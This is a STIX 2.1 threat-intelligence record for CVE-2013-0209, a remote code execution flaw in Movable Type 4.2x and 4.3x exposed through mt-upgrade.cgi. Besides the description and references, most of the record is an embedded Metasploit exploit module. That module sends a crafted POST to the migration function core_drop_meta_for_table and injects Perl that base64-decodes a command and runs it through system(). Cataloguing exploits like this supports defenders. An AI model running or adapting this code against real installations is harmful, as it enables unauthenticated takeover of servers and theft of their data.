{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--a4d3e9e1-659a-4bef-96be-b87ce7d83f1f",
    "created": "2024-08-14T17:08:57.362121Z",
    "modified": "2024-08-14T17:08:57.362125Z",
    "name": "Movable Type 4.2x, 4.3x Web Upgrade Remote Code Execution",
    "description": " This module can be used to execute a payload on MoveableType (MT) that exposes a CGI script, mt-upgrade.cgi (usually at /mt/mt-upgrade.cgi) that is used during installation and updating of the platform. The vulnerability arises due to the following properties: 1. This script may be invoked remotely without requiring authentication to any MT instance. 2. Through a crafted POST request, it is possible to invoke particular database migration functions (i.e. functions that bring the existing database up-to-date with an updated codebase) by name and with particular parameters. 3. A particular migration function, core_drop_meta_for_table, allows a class parameter to be set which is used directly in a perl eval statement, allowing perl code injection. ",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/exploits/multi/http/movabletype_upgrade_exec.rb",
            "external_id": "movabletype_upgrade_exec.rb"
        },
        {
            "source_name": "CVE",
            "external_id": "2013-0209"
        },
        {
            "source_name": "reference",
            "url": "http://www.sec-1.com/blog/?p=402"
        },
        {
            "source_name": "reference",
            "url": "http://www.movabletype.org/2013/01/movable_type_438_patch.html"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Exploit::Remote\n  Rank = ExcellentRanking\n\n  include Exploit::Remote::HttpClient\n\n  def initialize(info = {})\n    super(update_info(info,\n      'Name'           => 'Movable Type 4.2x, 4.3x Web Upgrade Remote Code Execution',\n      'Description'    => %q{\n          This module can be used to execute a payload on MoveableType (MT) that\n          exposes a CGI script, mt-upgrade.cgi (usually at /mt/mt-upgrade.cgi),\n          that is used during installation and updating of the platform.\n          The vulnerability arises due to the following properties:\n          1. This script may be invoked remotely without requiring authentication\n          to any MT instance.\n          2. Through a crafted POST request, it is possible to invoke particular\n          database migration functions (i.e. functions that bring the existing\n          database up-to-date with an updated codebase) by name and with\n          particular parameters.\n          3. A particular migration function, core_drop_meta_for_table, allows\n          a class parameter to be set which is used directly in a perl eval\n          statement, allowing perl code injection.\n      },\n      'Author'         =>\n        [\n          'Kacper Nowak',\n          'Nick Blundell',\n          'Gary O\\'Leary-Steele'\n        ],\n      'References'     =>\n        [\n          [ 'CVE', '2012-6315' ], # superseded by CVE-2013-0209 (duplicate)\n          [ 'CVE', '2013-0209' ],\n          [ 'OSVDB', '89322' ],\n          [ 'URL', 'http://www.sec-1.com/blog/?p=402' ],\n          [ 'URL', 'http://www.movabletype.org/2013/01/movable_type_438_patch.html' ]\n        ],\n      'Arch'\t\t => ARCH_CMD,\n      'Payload'\t =>\n        {\n          'Compat' =>\n            {\n              'PayloadType' => 'cmd'\n            }\n        },\n      'Platform'\t =>\n        [\n          'win',\n          'unix'\n        ],\n      'Targets'\t =>\n        [\n          ['Movable Type 4.2x, 4.3x', {}]\n        ],\n      'Privileged'\t => false,\n      'DisclosureDate' => '2013-01-07',\n      'DefaultTarget'\t => 0))\n\n    register_options(\n      [\n        OptString.new('TARGETURI', [true, 'The URI path of the Movable Type installation', '/mt'])\n      ])\n  end\n\n  def check\n    fingerprint = rand_text_alpha(5)\n    vprint_status(\"Sending check...\")\n    begin\n      res = http_send_raw(fingerprint)\n    rescue Rex::ConnectionError\n      return Exploit::CheckCode::Unknown\n    end\n    if (res)\n      if (res.code == 200 and res.body =~ /Can't locate object method \\\\\"dbi_driver\\\\\" via package \\\\\"#{fingerprint}\\\\\" at/)\n        return Exploit::CheckCode::Vulnerable\n      elsif (res.code != 200)\n        return Exploit::CheckCode::Unknown\n      else\n        return Exploit::CheckCode::Safe\n      end\n    else\n      return Exploit::CheckCode::Unknown\n    end\n  end\n\n  def exploit\n    print_status(\"Sending payload...\")\n    http_send_cmd(payload.encoded)\n  end\n\n  def http_send_raw(cmd)\n    path = normalize_uri(target_uri.path, '/mt-upgrade.cgi')\n    pay = cmd.gsub('\\\\', '\\\\\\\\').gsub('\"', '\\\"')\n    send_request_cgi(\n      {\n        'uri'       => path,\n        'method'    => 'POST',\n        'vars_post' =>\n          {\n            '__mode'     => 'run_actions',\n            'installing' => '1',\n            'steps'      => %{[[\"core_drop_meta_for_table\",\"class\",\"#{pay}\"]]}\n          }\n      })\n  end\n\n  def http_send_cmd(cmd)\n    pay = 'v0;use MIME::Base64;system(decode_base64(q('\n    pay << Rex::Text.encode_base64(cmd)\n    pay << ')));return 0'\n    http_send_raw(pay)\n  end\nend\n",
    "x_mitre_disclosure_date": "2013-01-07"
}